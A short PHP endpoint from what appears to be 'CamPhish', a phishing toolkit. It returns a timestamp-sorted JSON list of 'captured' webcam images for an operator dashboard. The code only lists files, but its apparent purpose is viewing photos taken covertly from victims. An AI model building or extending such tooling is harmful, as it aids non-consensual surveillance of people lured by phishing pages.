<?php
/**
 * CamPhish Dashboard API - Get Images
 * Author: Rahul Kushwaha
 * Returns list of captured image filenames
 */

header('Content-Type: application/json');
header('Cache-Control: no-cache, must-revalidate');

// Base path to the root CamPhish directory (relative to this API file location)
$basePath = dirname(dirname(__DIR__));

// Get cam*.png files from root directory
$imageFiles = glob($basePath . '/cam*.png');

$images = [];

if (is_array($imageFiles) && count($imageFiles) > 0) {
    foreach ($imageFiles as $file) {
        // Get just the filename without the path
        $filename = basename($file);
        $images[] = $filename;
    }
    
    // Sort by filename (which includes timestamp) in descending order
    rsort($images);
}

echo json_encode($images);
